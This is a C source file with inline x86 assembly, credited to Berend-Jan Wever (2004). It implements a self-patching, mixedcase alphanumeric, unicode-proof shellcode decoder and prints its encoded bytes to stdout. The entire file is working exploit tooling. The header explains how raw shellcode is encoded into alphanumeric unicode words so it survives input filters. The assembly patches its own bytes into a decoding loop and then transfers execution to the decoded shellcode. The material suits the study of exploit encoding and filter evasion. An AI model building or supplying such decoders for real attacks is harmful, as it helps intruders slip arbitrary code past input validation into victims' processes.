/*
  Mixedcase, alphanumeric, unicode-proof shellcode decoder.
  (C) Copyright 2004 Berend-Jan Wever
  
  This program is free software; you can redistribute it and/or modify it under
  the terms of the GNU General Public License version 2, 1991 as published by
  the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but WITHOUT
  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
  FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
  details.

  A copy of the GNU General Public License can be found at:
    http://www.gnu.org/licenses/gpl.html
  or you can write to:
    Free Software Foundation, Inc.
    59 Temple Place - Suite 330
    Boston, MA  02111-1307
    USA.

  Thanks to obscou for his phrack article on unicode-proof shellcode.

  Pre-execution requirements:
    %ecx = baseaddress of code.
  Short description:
    The code will "add-patch" it's own last bytes into a decoder loop, this
    decoder loop will then convert the string behind it from alphanumeric
    unicode characters back to the origional shellcode untill it reaches the
    character 'A'. Execution is then transfered to the decoded shellcode.
  Encoding scheme for origional shellcode:
    Every byte 0xAB is encoded in two unicode words:  (CD 00) and (EF 00)
    Where F = B and E is arbitrary (3-7) as long as EF is alphanumeric,
    D = A-E and C is arbitrary (3-7) as long as CD is alphanumeric.
    The encoded data is terminated by a "A" (0x41) character, DO NOT USE THIS
    in your encoded shellcode data, as it will stop the decoding!
*/

// allignment null -> byte
#define ALECX         "add %al, 0(%ecx)\n"
#define ALEDX         "add %al, 0(%edx)\n"


int main(void) {
  __asm__(
    // output the code to stdout
      "  mov     $end-start, %edx       \n" // length
      "  mov     $start, %ecx           \n" // source
      "  mov     $0x1, %ebx             \n" // stdout
      "  mov     $0x4, %eax             \n" // write
      "  int     $0x80                  \n"
      "  jmp     end                    \n"
    "start:                             \n"

    // Now we have to get a register to point to our decoder loop, so we can
    // start patching. Assuming %ecx points to the baseaddress of this code,
    // the decoder loop will be around %ecx+0x100. Since our limited instruction
    // set does not include a direct way to add a value to a register, we have
    // to do this in another way:
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"
      "  xor     $0, %al                \n"

      // Add 0x100 to the baseaddress (0xA1A2A3A4)
      "  push    $0                     \n"
      "  pop     %eax                   \n"
ALECX "  push    %ecx                   \n" //                > A4A3A2A1s4s3s2s1
ALECX "  inc     %esp                   \n" //                  > A3A2A1s4s3s2s1
ALECX "  pop     %edx                   \n" // ecx = 0xs4A1A2A3
ALECX "  inc     %edx                   \n" // ecx = 0xs4B1B2B3
ALECX "  push    %edx                   \n" //                  > B3B2B1s4s3s2s1
ALECX "  dec     %esp                   \n" //                > A4B3B2B1s4s3s2s1
ALECX "  pop     %ecx                   \n" // ecx = baseaddress+0x100

      // Patch 00 39 00 -> 8039 41     CMP   B[ECX], 41
ALECX "  dec     %ecx                   \n"
ALECX "  push    %ecx                   \n" //               > (data-1) s4s3s2s1
ALECX "  dec     %ecx                   \n"
ALECX "  push    %ecx                   \n" //      > (data-2) (data-1) s4s3s2s1
ALECX "  dec     %ecx                   \n"
ALECX "  push    $0x41004100            \n"
ALECX "  pop     %edx                   \n" // dh = 0x41, dl = 0x0
      "  add     %dh, (%ecx)            \n" // 00 -> 41
ALECX "  dec     %ecx                   \n"
ALECX "  dec     %ecx                   \n"
ALECX "  dec     %edx                   \n" // dh = 0x40, dl = -1
      "  add     %dh, (%ecx)            \n" // 00 -> 40
      "  add     %dh, (%ecx)            \n" // 40 -> 80
      // Patch 47 00    -> 8802        MOV     [EDX], AL
ALECX "  dec     %ecx                   \n"
ALECX "  dec     %ecx                   \n"
ALECX "  inc     %edx                   \n" // dl = 0
ALECX "  inc     %edx                   \n" // dl = 1
ALECX "  inc     %edx                   \n" // dl = 2
      "  add     %dl, 0(%ecx)           \n" // 00 -> 02
      "  dec     %ecx                   \n"
      "  add     %dh, (%ecx)            \n" // 47 -> 88
      // Patch 00 41 00 -> 0241 02     ADD     AL, [edx+2]
ALECX "  dec     %ecx                   \n"
      "  add     %dl, 0(%ecx)           \n" // 00 -> 02
      "  dec     %ecx                   \n"
ALECX "  dec     %ecx                   \n"
      "  add     %dl, 0(%ecx)           \n" // 00 -> 02
      // Patch 6B 00 4D -> 6B01 10     IMUL  EAX, [ECX], 10
      "  dec     %ecx                   \n"
      "  add     %dh, (%ecx)            \n" // 4D -> 8E
      "  add     %dh, (%ecx)            \n" // 8E -> CF
      "  add     %dh, (%ecx)            \n" // CF -> 10
ALECX "  dec     %ecx                   \n"
ALECX "  dec     %edx                   \n" // dl = 1
      "  add     %dl, 0(%ecx)           \n" // 00 -> 01
      "  pop     %ecx                   \n" // ecx = data-2  > (data-1) s4s3s2s1
ALECX "  pop     %edx                   \n" // edx = data-1           > s4s3s2s1
      // This is the part we are patching to create the unicode decoder loop:
ALEDX "  inc     %ecx                   \n" // we start with base-2
ALEDX "  inc     %ecx                   \n" // which means the first converted
ALEDX "  inc     %ecx                   \n" // char will be ar base+2, so there
ALEDX "  inc     %ecx                   \n" // is a nop char behind the decoder

ALEDX " .byte 0x6B, 0x00, 0x4D          \n" // 6B01 10     IMUL  EAX, [ECX], 10
      " .byte 0x00, 0x41, 0x00          \n" // 0241 02     ADD   AL, [ECX+2]
      " .byte 0x47, 0x00                \n" // 8802        MOV   [EDX], AL
      "  inc     %edx                   \n" 
      " .byte 0x00, 0x39, 0x00          \n" // 8039 41     CMP   BYTE PTR [ECX], 41
      " .byte 0x75, 0                   \n" // 75 E2       JNZ   loop

      // Completely useless nop for alligning data behind the decoder
      "  xor     $0, %al                \n"
      // First decoded byte will be used for the loop offset.
      " .byte 0x4A, 0, 0x42, 0          \n" // "E2"        JNZ   loop
//      " .byte 0x48, 0, 0x4C, 0          \n" // "CC"
//      " .byte 0x41, 0\n"
      "end:                             \n"
  );
 exit(0);
}
